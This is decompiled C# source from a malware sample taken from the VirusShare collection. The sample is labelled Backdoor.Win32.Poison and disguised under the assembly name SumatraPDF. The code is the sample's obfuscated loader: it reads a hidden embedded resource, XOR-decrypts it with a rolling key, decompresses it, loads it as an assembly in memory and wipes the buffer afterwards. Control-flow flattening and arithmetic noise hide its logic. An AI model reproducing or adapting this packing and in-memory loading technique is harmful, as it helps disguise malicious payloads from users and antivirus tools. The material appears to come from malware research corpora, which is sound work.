// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: SumatraPDF, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 735CCAFF-475B-4E3F-81A7-1B168C2B944C
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Backdoor.Win32.Poison.hjzu-0c71efd90e5a7373f095f742a538e03c8fe06bd10bd9d4340b3520a8ba14ffa3.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly 셓ԫ\uE672摦봍뛋쪓\u2E8E;

  static \u003CModule\u003E() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.ᚤ둈\uA70Eㅒᄃྮ稹さ);

  internal static Assembly ᚤ둈\uA70Eㅒᄃྮ稹さ(object sender, ResolveEventArgs args)
  {
label_0:
    while ((object) \u003CModule\u003E.셓ԫ\uE672摦봍뛋쪓\u2E8E == null)
    {
      int num1 = 5;
      BinaryReader binaryReader;
      while (true)
      {
        Stream manifestResourceStream;
        byte[] buffer;
        byte num2;
        int index;
        int num3;
        do
        {
          switch (num1)
          {
            case 0:
              goto label_0;
            case 2:
              num3 = index < buffer.Length ? 1 : 0;
              num1 = 4;
              continue;
            case 3:
              binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress));
              goto label_9;
            case 4:
              buffer[index] = (byte) ((uint) buffer[index] ^ (uint) num2);
              num2 = (byte) ((int) num2 * (-1177938128 - ((166305976 ^ 499388573) + 518395525 ^ 1313720359) ^ 248984666 + ((188279564 ^ 1310617570 ^ 1362516605) + (-1947887271 - (-524759356 - 1704617238 - 392948519)) ^ 1561596569 - 967191598 ^ 1937278027 ^ 189570012) - 965028917) % (451691888 ^ 1458152390 - 1006460758));
              ++index;
              goto case 2;
            case 5:
              goto label_8;
            default:
              manifestResourceStream.Read(buffer, 0, buffer.Length);
              num2 = (byte) 233;
              index = 0;
              num1 = 2;
              continue;
          }
        }
        while (num3 != 0);
        num1 = 3;
        continue;
label_8:
        manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("Ỿ쭴\uEFB2尷䀞䓦瀽戢");
        buffer = new byte[manifestResourceStream.Length];
        num1 = 1;
      }
label_9:
      try
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        int num4 = 1;
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_9;
            case 2:
              goto label_15;
            default:
              \u003CModule\u003E.셓ԫ\uE672摦봍뛋쪓\u2E8E = Assembly.Load(numArray);
              Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
              num4 = 2;
              continue;
          }
        }
      }
      finally
      {
        binaryReader?.Dispose();
      }
    }
label_15:
    return Array.IndexOf<string>(\u003CModule\u003E.셓ԫ\uE672摦봍뛋쪓\u2E8E.GetManifestResourceNames(), args.Name) == -1 ? (Assembly) null : \u003CModule\u003E.셓ԫ\uE672摦봍뛋쪓\u2E8E;
  }
}
